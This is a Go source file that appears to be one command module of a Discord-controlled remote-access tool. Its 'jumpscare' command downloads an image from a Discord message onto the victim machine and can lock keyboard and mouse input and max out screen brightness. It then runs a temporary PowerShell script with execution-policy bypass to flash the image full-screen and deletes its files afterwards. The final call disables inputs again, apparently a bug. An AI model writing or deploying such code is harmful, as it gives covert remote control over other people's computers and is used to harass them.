package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"
)

func (*ScareCommand) Exec(ctx *store.CommandContext, args []string) {
	timeout, found := utils.FindNumber(strings.Join(args, " "))
	if found == false {
		timeout = 670
	}

	urls := discord.GetUrls(ctx)
	if len(urls) == 0 {
		ctx.ReplyMsg("🟥 Failed to find any urls.")
		return
	}

	path, err := utils.DownloadFile(urls[0], "")
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to download - %s", err))
		return
	}

	scareName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
	scarePath := filepath.Join(os.TempDir(), scareName)

	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
		funcs.DisableInputs(true)
	}

	if store.RuntimeSettings.JumpscareMaxBrightnessBefore {
		utils.RunCommand(
			"powershell",
			"-c",
			fmt.Sprintf("(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, %d)", 100),
		)
	}

	var jumpscare strings.Builder
	jumpscare.WriteString("Add-Type -AssemblyName System.Windows.Forms\n")
	jumpscare.WriteString("Add-Type -AssemblyName System.Drawing\n")
	fmt.Fprintf(&jumpscare, "$img = [System.Drawing.Image]::FromFile('%s')\n", path)
	jumpscare.WriteString("$f = New-Object System.Windows.Forms.Form\n")
	jumpscare.WriteString("$f.FormBorderStyle = 'None'\n")
	jumpscare.WriteString("$f.WindowState = 'Maximized'\n")
	jumpscare.WriteString("$f.TopMost = $true\n")
	jumpscare.WriteString("$p = New-Object System.Windows.Forms.PictureBox\n")
	jumpscare.WriteString("$p.Dock = 'Fill'\n")
	jumpscare.WriteString("$p.Image = $img\n")
	jumpscare.WriteString("$p.SizeMode = 'StretchImage'\n")
	jumpscare.WriteString("$f.Controls.Add($p)\n")
	jumpscare.WriteString("$f.Show()\n")
	fmt.Fprintf(&jumpscare, "Start-Sleep -milliseconds %d\n", timeout)
	jumpscare.WriteString("$f.Close()\n")
	fmt.Fprintf(&jumpscare, "rm -fo '%s'\n", path)
	fmt.Fprintf(&jumpscare, "rm -fo '%s'\n", scarePath)

	err = os.WriteFile(scarePath, []byte(jumpscare.String()), 0666)
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to jumpscare - %s", err))
		return
	}

	cmd := utils.StartCommand("powershell", "-nop", "-ep", "bypass", "-file", scarePath)
	cmd.Start()

	ctx.ReplyMsg("🟩 Successfully jumpscared.")

	time.Sleep(time.Duration(timeout) * time.Millisecond)

	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
		funcs.DisableInputs(true)
	}
}

func (*ScareCommand) Name() string {
	return "jumpscare"
}

func (*ScareCommand) Info() string {
	return "Displays a picture on the screen for a short time."
}

type ScareCommand struct{}
